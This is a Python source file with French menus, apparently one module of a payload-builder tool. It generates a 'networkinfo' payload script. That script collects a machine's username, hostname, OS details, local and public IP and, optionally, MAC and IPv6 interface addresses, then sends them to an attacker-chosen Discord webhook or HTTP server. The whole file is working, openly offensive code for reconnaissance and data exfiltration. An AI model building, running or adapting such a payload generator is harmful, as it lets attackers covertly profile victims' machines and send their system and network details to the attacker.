import os
from colorama import Fore, Style, init
import time

init(autoreset=True)

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def affichage():
    clear()
    print(Fore.CYAN + "=== Configuration Network Info ===\n\n" + Style.RESET_ALL)
    print(f"""
          
          {Fore.YELLOW}Options : 
{Fore.WHITE}
    1. Délai avant la collecte (en secondes)
    2. Inclure les interfaces réseau détaillées
        
         
          {Fore.YELLOW}Sortie et envoi:
{Fore.WHITE}
    3. Envoi sur Discord
    4. Envoi sur serveur HTTP
    
{Fore.GREEN}
Tapez : set <num> pour configurer
Tapez : show pour afficher la config
Tapez : create pour générer
Tapez : exit pour quitter
            {Style.RESET_ALL}
                  """)

def networkinfo():
    clear()
    print("=== Network Info Configuration ===\n\n")

    choix = {
        "Délai avant collecte": None,
        "Interfaces réseau détaillées": None,
        "Envoi sur Discord": None,
        "Envoi sur serveur HTTP": None,
    }

    # -----------------------------------------------
    # Fonctions de configuration
    # -----------------------------------------------

    def delai_option():
        clear()
        delai = input("Délai avant la collecte (secondes) : ")
        try:
            delai = int(delai)
            if delai < 0:
                print(Fore.RED + "Le délai doit être positif." + Style.RESET_ALL)
                time.sleep(1)
                affichage()
                return
            choix["Délai avant collecte"] = delai
            print(f"Délai défini sur {delai} secondes.")
            time.sleep(1)
        except ValueError:
            print(Fore.RED + "Veuillez entrer un nombre valide." + Style.RESET_ALL)
            time.sleep(1)
        affichage()

    def interfaces_option():
        clear()
        reponse = input("Inclure les interfaces réseau détaillées (adresses MAC, IPv6...) ? (y/n) : ").lower()
        choix["Interfaces réseau détaillées"] = reponse == 'y'
        print(f"Interfaces détaillées : {'activées' if choix['Interfaces réseau détaillées'] else 'désactivées'}.")
        time.sleep(1)
        affichage()

    def discord_option():
        clear()
        discord = input("Entrez l'URL du webhook Discord : ").strip()
        if discord:
            choix["Envoi sur Discord"] = discord
            print("Webhook Discord défini.")
        else:
            choix["Envoi sur Discord"] = None
            print(Fore.YELLOW + "Aucun webhook Discord défini." + Style.RESET_ALL)
        time.sleep(1)
        affichage()

    def http_option():
        clear()
        http = input("Entrez l'URL du serveur HTTP : ").strip()
        if http:
            choix["Envoi sur serveur HTTP"] = http
            print("URL HTTP définie.")
        else:
            choix["Envoi sur serveur HTTP"] = None
            print(Fore.YELLOW + "Aucune URL HTTP définie." + Style.RESET_ALL)
        time.sleep(1)
        affichage()

    # -----------------------------------------------
    # Liste des options (même ordre que le menu)
    # -----------------------------------------------
    options = [
        ("Délai avant collecte",            delai_option),
        ("Interfaces réseau détaillées",    interfaces_option),
        ("Envoi sur Discord",               discord_option),
        ("Envoi sur serveur HTTP",          http_option),
    ]

    # -----------------------------------------------
    # Génération du payload
    # -----------------------------------------------
    def create_payload():

        # Au moins un mode d'envoi doit être choisi
        if choix["Envoi sur Discord"] is None and choix["Envoi sur serveur HTTP"] is None:
            print(Fore.RED + "Erreur : vous devez choisir au moins un mode d'envoi (option 3 ou 4)." + Style.RESET_ALL)
            input("\nAppuyez sur Entrée pour continuer...")
            return

        # Dossier de sortie
        payload_dir  = os.path.join("Option", "modules", "payload", "payload_created")
        payload_path = os.path.join(payload_dir, "networkinfo_payload.py")
        os.makedirs(payload_dir, exist_ok=True)

        with open(payload_path, "w", encoding="utf-8") as f:
            f.write("import os\n")
            f.write("import time\n")
            f.write("import getpass\n")
            f.write("import platform\n")
            f.write("import socket\n")
            f.write("import requests\n")
            if choix["Interfaces réseau détaillées"]:
                # psutil permet de lister les interfaces avec adresses MAC et IPv6
                f.write("import psutil\n")
            f.write("\n")

            # --- Variables de configuration ---
            f.write("# ============================================================\n")
            f.write("# Configuration générée automatiquement\n")
            f.write("# ============================================================\n")
            f.write(f"DELAI               = {choix['Délai avant collecte'] or 0}\n")
            f.write(f"INTERFACES_DETAILS  = {choix['Interfaces réseau détaillées'] if choix['Interfaces réseau détaillées'] is not None else False}\n")

            if choix["Envoi sur Discord"]:
                f.write(f"DISCORD_WEBHOOK     = {repr(choix['Envoi sur Discord'])}\n")
            else:
                f.write("DISCORD_WEBHOOK     = None\n")

            if choix["Envoi sur serveur HTTP"]:
                f.write(f"HTTP_URL            = {repr(choix['Envoi sur serveur HTTP'])}\n")
            else:
                f.write("HTTP_URL            = None\n")

            f.write("\n")

            # --- Logique de collecte ---
            f.write("# ============================================================\n")
            f.write("# Collecte des informations réseau\n")
            f.write("# ============================================================\n\n")

            f.write("def collecter_infos():\n")
            f.write('    """\n')
            f.write("    Collecte les informations système et réseau de la machine.\n")
            f.write("    Retourne un dictionnaire avec toutes les données.\n")
            f.write('    """\n')
            f.write("    infos = {}\n\n")

            f.write("    # Infos système de base\n")
            f.write("    infos['Utilisateur']   = getpass.getuser()\n")
            f.write("    infos['Système']       = platform.system()\n")
            f.write("    infos['Nom machine']   = platform.node()\n")
            f.write("    infos['Release']       = platform.release()\n")
            f.write("    infos['Version OS']    = platform.version()\n")
            f.write("    infos['Architecture']  = platform.machine()\n")
            f.write("    infos['Processeur']    = platform.processor()\n\n")

            f.write("    # IP locale\n")
            f.write("    try:\n")
            f.write("        infos['IP locale'] = socket.gethostbyname(socket.gethostname())\n")
            f.write("    except Exception:\n")
            f.write("        infos['IP locale'] = 'N/A'\n\n")

            f.write("    # IP publique (via service externe)\n")
            f.write("    try:\n")
            f.write("        infos['IP publique'] = requests.get('https://api.ipify.org', timeout=5).text\n")
            f.write("    except Exception:\n")
            f.write("        infos['IP publique'] = 'N/A'\n\n")

            if choix["Interfaces réseau détaillées"]:
                f.write("    # Interfaces réseau détaillées (psutil)\n")
                f.write("    if INTERFACES_DETAILS:\n")
                f.write("        try:\n")
                f.write("            interfaces = psutil.net_if_addrs()\n")
                f.write("            lignes = []\n")
                f.write("            for nom_if, adresses in interfaces.items():\n")
                f.write("                for addr in adresses:\n")
                f.write("                    lignes.append(f\"{nom_if} | {addr.family.name} | {addr.address}\")\n")
                f.write("            infos['Interfaces'] = '\\n'.join(lignes)\n")
                f.write("        except Exception as e:\n")
                f.write("            infos['Interfaces'] = f'Erreur : {e}'\n\n")

            f.write("    return infos\n\n")

            # --- Formatage du rapport ---
            f.write("def formater_rapport(infos):\n")
            f.write('    """Met en forme les infos pour l\'affichage et l\'envoi."""\n')
            f.write("    lignes = [f\"{cle}: {valeur}\" for cle, valeur in infos.items()]\n")
            f.write("    return '\\n'.join(lignes)\n\n")

            # --- Fonction principale ---
            f.write("def lancer_networkinfo():\n")

            f.write("    if DELAI > 0:\n")
            f.write("        print(f\"Attente de {DELAI} secondes...\")\n")
            f.write("        time.sleep(DELAI)\n\n")

            f.write("    print(\"Collecte des informations réseau...\\n\")\n")
            f.write("    infos   = collecter_infos()\n")
            f.write("    rapport = formater_rapport(infos)\n\n")

            f.write("    # Affichage local\n")
            f.write("    print(rapport)\n\n")

            # --- Envoi Discord ---
            f.write("    # ---- Envoi Discord (optionnel) ----\n")
            f.write("    if DISCORD_WEBHOOK:\n")
            f.write("        # Discord limite les messages à 2000 caractères\n")
            f.write("        message = f\"**Network Info**\\n```\\n{rapport[:1900]}\\n```\"\n")
            f.write("        try:\n")
            f.write("            requests.post(DISCORD_WEBHOOK, json={'content': message})\n")
            f.write("            print(\"Rapport envoyé sur Discord.\")\n")
            f.write("        except Exception as e:\n")
            f.write("            print(f\"Erreur envoi Discord : {e}\")\n\n")

            # --- Envoi HTTP ---
            f.write("    # ---- Envoi HTTP (optionnel) ----\n")
            f.write("    if HTTP_URL:\n")
            f.write("        try:\n")
            f.write("            requests.post(HTTP_URL, json=infos)\n")
            f.write("            print(\"Rapport envoyé sur le serveur HTTP.\")\n")
            f.write("        except Exception as e:\n")
            f.write("            print(f\"Erreur envoi HTTP : {e}\")\n\n")

            f.write("# Point d'entrée\n")
            f.write("if __name__ == '__main__':\n")
            f.write("    lancer_networkinfo()\n")

        print(Fore.GREEN + f"Payload généré dans {payload_path}" + Style.RESET_ALL)
        input("\nAppuyez sur Entrée pour continuer...")

    # -----------------------------------------------
    # Boucle principale
    # -----------------------------------------------
    while True:
        affichage()
        cmd = input(Fore.GREEN + ">> " + Style.RESET_ALL).strip()

        if cmd.lower() == "exit":
            break

        elif cmd.lower().startswith("set "):
            try:
                option_choix = int(cmd.split()[1]) - 1
                if 0 <= option_choix < len(options):
                    options[option_choix][1]()
                else:
                    print(Fore.RED + "Numéro d'option invalide." + Style.RESET_ALL)
                    time.sleep(1)
            except (ValueError, IndexError):
                print(Fore.RED + "Veuillez saisir 'set <num>'" + Style.RESET_ALL)
                time.sleep(1)

        elif cmd.lower() == "show":
            clear()
            print(Fore.CYAN + "\nConfiguration actuelle du module Network Info :\n" + Style.RESET_ALL)
            for option, value in choix.items():
                couleur = Fore.GREEN if value is not None else Fore.RED
                print(f"  {option:35s} : {couleur}{value}{Style.RESET_ALL}")
            input("\nAppuyez sur Entrée pour continuer...")

        elif cmd.lower() == "create":
            create_payload()

        else:
            print(Fore.RED + "Commande inconnue." + Style.RESET_ALL)
            time.sleep(1)


